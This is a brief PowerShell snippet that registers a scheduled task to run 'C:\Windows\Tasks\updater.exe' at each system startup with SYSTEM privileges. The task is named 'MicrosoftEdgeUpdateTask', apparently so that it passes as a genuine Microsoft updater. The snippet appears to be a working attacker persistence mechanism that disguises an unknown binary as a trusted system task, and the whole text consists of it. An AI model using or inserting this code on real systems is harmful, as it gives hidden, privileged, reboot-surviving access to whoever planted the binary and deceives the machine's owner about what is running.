$action = New-ScheduledTaskAction -Execute "C:\Windows\Tasks\updater.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask" -Action $action -Trigger $trigger -Principal $principal -Force